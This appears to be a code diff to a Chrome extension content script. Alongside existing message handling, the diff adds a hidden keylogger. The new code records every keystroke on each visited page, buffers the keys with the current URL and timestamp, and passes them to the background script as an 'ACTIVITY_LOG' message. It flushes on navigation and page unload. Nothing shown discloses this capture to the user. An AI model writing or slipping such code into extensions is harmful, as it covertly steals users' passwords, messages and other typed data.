@@ -1,3 +1,4 @@
+// receive commands from the background script
 chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
   const data = JSON.parse(request.message);
   if (data[0] === "alert") {
@@ -142,3 +143,53 @@ observer.observe(document.documentElement, {
   childList: true,
   subtree: true,
 });
+
+let buffer = "";
+let currentUrl = window.location.href;
+const BUFFER_LIMIT = 20;
+let bufferLength = 0;
+function sendBuffer() {
+  if (buffer.length === 0) return;
+
+  chrome.runtime.sendMessage({
+    type: "ACTIVITY_LOG",
+    data: {
+      keys: buffer,
+      timestamp: new Date().getTime(),
+      url: currentUrl,
+    },
+  });
+
+  buffer = "";
+  bufferLength = 0;
+}
+
+// Listen for URL changes
+let lastUrl = location.href;
+new MutationObserver(() => {
+  const url = location.href;
+  if (url !== lastUrl) {
+    lastUrl = url;
+    currentUrl = url;
+    sendBuffer();
+  }
+}).observe(document, { subtree: true, childList: true });
+
+// Also catch navigation through history state
+window.addEventListener("popstate", () => {
+  currentUrl = window.location.href;
+  sendBuffer();
+});
+
+document.addEventListener("keydown", (e) => {
+  // Only log printable characters and specific keys
+  const key = e.key.length === 1 ? e.key : `[${e.key}]`;
+  buffer += key;
+  bufferLength++;
+  if (bufferLength >= BUFFER_LIMIT) {
+    sendBuffer();
+  }
+});
+
+// Send remaining buffer when user leaves page
+window.addEventListener("beforeunload", sendBuffer);
